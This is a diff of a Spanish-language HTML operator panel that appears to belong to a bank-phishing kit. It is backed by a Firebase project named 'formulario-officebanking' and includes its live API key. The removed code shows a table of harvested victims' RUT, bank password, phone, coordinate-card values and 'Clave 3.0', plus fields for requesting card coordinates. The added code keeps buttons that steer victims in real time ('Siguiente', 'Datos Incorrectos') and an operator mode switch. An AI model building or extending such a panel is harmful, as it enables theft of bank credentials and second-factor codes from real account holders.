@@ -3,16 +3,71 @@
 <head>
   <meta charset="UTF-8">
   <title>Panel de Control</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-    button { margin: 4px; padding: 10px; }
-    table { width: 100%; margin-top: 20px; border-collapse: collapse; background: white; }
-    th, td { padding: 8px; border: 1px solid #ccc; text-align: center; }
-    input.coord { width: 40px; text-align: center; font-size: 16px; margin: 0 5px; }
-  </style>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 60px;
+      height: 34px;
+    }
+    .switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0;
+      right: 0; bottom: 0;
+      background-color: #ccc;
+      transition: 0.4s;
+      border-radius: 34px;
+    }
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 26px; width: 26px;
+      left: 4px; bottom: 4px;
+      background-color: white;
+      transition: 0.4s;
+      border-radius: 50%;
+    }
+    input:checked + .slider {
+      background-color: #2196F3;
+    }
+    input:checked + .slider:before {
+      transform: translateX(26px);
+    }
+    #estado {
+      font-weight: bold;
+      font-size: 20px;
+      margin-left: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Panel de Control</h2>
+  <label class="switch">
+    <input type="checkbox" id="modoSwitch" onchange="toggleModo()">
+    <span class="slider"></span>
+  </label>
+  <span id="estado">Cargando...</span>
+  <div style="margin-top: 20px;">
+    <button onclick="validar('siguiente')" style="padding: 10px 15px; margin-right: 10px;">Siguiente</button>
+    <button onclick="validar('error')" style="padding: 10px 15px; background: red; color: white;">Datos Incorrectos</button>
+  </div>
+
   <script>
+    function validar(valor) {
+      db.ref("validacion_estado").set(valor);
+    }
     const firebaseConfig = {
       apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
       authDomain: "formulario-officebanking.firebaseapp.com",
@@ -22,72 +77,27 @@
       messagingSenderId: "604053438195",
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
+
     firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const refModo = db.ref("modo_asistente");
 
-    function setModo(valor) {
-      firebase.database().ref("modo_asistente").set(valor);
+    function toggleModo() {
+      const isChecked = document.getElementById("modoSwitch").checked;
+      refModo.set(isChecked ? "activo" : "inactivo");
     }
 
-    function enviarEstado(valor) {
-      firebase.database().ref("validacion_estado").set(valor);
+    function actualizarEstado(valor) {
+      const estado = document.getElementById("estado");
+      const sw = document.getElementById("modoSwitch");
+      estado.innerText = valor ? valor.toUpperCase() : "NO DEFINIDO";
+      estado.style.color = valor === "activo" ? "green" : "red";
+      sw.checked = valor === "activo";
     }
 
-    function actualizarCoordenadas() {
-      const c1 = document.getElementById("coord1").value;
-      const c2 = document.getElementById("coord2").value;
-      const c3 = document.getElementById("coord3").value;
-      firebase.database().ref("coordenadas_temporales").set({c1, c2, c3});
-    }
-
-    function cargarRegistros() {
-      const tabla = document.getElementById("registros");
-      firebase.database().ref("usuarios").on("value", snapshot => {
-        const data = snapshot.val();
-        tabla.innerHTML = "<tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Teléfono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>";
-        for (const key in data) {
-          const row = data[key];
-          const tr = document.createElement("tr");
-          tr.innerHTML = `
-            <td>${row.timestamp || ""}</td>
-            <td>${row.rut || ""}</td>
-            <td>${row.password || ""}</td>
-            <td>${row.telefono || ""}</td>
-            <td>${row.coordenadas || ""}</td>
-            <td>${row.clave3 || ""}</td>
-          `;
-          tabla.appendChild(tr);
-        }
-      });
-    }
-
-    window.onload = cargarRegistros;
+    refModo.on("value", (snapshot) => {
+      actualizarEstado(snapshot.val());
+    });
   </script>
-</head>
-<body>
-  <h2>Panel de Control</h2>
-
-  <div>
-    <h3>Modo Asistente</h3>
-    <button onclick="setModo('activo')">🔴 Activar</button>
-    <button onclick="setModo('inactivo')">⚪ Desactivar</button>
-  </div>
-
-  <div>
-    <h3>Control de Flujo</h3>
-    <button onclick="enviarEstado('siguiente')">✅ Siguiente</button>
-    <button onclick="enviarEstado('error')">❌ Datos ingresados Incorrectos</button>
-  </div>
-
-  <div>
-    <h3>Coordenadas Solicitadas</h3>
-    <input id="coord1" class="coord" maxlength="2" /> 
-    <input id="coord2" class="coord" maxlength="2" /> 
-    <input id="coord3" class="coord" maxlength="2" />
-    <button onclick="actualizarCoordenadas()">Enviar</button>
-  </div>
-
-  <table id="registros">
-    <tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Teléfono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>
-  </table>
 </body>
 </html>
